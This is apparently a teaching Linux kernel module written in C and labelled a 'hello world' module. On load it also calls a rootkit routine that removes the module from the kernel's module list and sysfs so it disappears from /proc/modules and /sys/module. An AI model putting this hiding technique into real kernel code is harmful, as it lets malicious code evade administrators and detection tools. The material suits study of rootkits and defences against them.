#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <asm/io.h>

#include <linux/proc_fs.h>
#include <linux/cred.h>
#include <linux/string.h>


MODULE_DESCRIPTION("Module \"hello word\" pour noyau linux");
MODULE_AUTHOR("William Fabre, LIP6");
MODULE_LICENSE("GPL");

static char *whom;
module_param_named(my_little_whom, whom, charp, 0644);
MODULE_PARM_DESC(my_little_whom, " Who are you?");

static int answer = 42 ;
module_param_named(readable_answer, answer, int, 0444);
MODULE_PARM_DESC(readable_answer, "The readable answer");


/* pointer to the module entry that is above the rootkit in /proc/modules (modules list) 
 * and /sys/module (kobject) -- acts as a placeholder for where to place the rootkit entry when shown*/
static struct list_head *prev_module;
static struct list_head *prev_kobj_module;


/* hiding files and the module */
static char hidden_module = 0;


static int howmany;
module_param(howmany, int, 0644);
MODULE_PARM_DESC(howmany, " How many do you want?");

/* MODULE FUNCTIONS */
void hide_module(void) {
	if (hidden_module) {/* if already hidden, return with no error */
		return;
	}

	prev_module = THIS_MODULE->list.prev;/* stores rootkit entry */
	list_del(&THIS_MODULE->list);/* removes rootkit entry from modules list */

	prev_kobj_module = THIS_MODULE->mkobj.kobj.entry.prev;/* stores kobject */
	kobject_del(&THIS_MODULE->mkobj.kobj);/* removes kobjects */
	list_del(&THIS_MODULE->mkobj.kobj.entry);

	hidden_module = !hidden_module;/* sets the module switch to 1 */
}

void show_module(void) {
	int restore;

	if (!hidden_module) {/* if already showing (0), return with no error */
		return;
	}

	list_add(&THIS_MODULE->list, prev_module);/* restores module entry */

	restore = kobject_add(&THIS_MODULE->mkobj.kobj,/* restores kobject */
			THIS_MODULE->mkobj.kobj.parent, "col");

	hidden_module = !hidden_module;/* sets module switch to 0*/
}


static int __init hello_init(void)
{
	pr_info("Hello, world\n");
	pr_info(" You are : %s", whom);
	pr_info(" You are : %d", howmany);
	hide_module();
	return 0;
}
module_init(hello_init);

static void __exit hello_exit(void)
{
	printk(" You are : %s", whom);
	pr_info(" You are : %d", howmany);
	pr_info("Goodbye, cruel world\n");
}
module_exit(hello_exit);
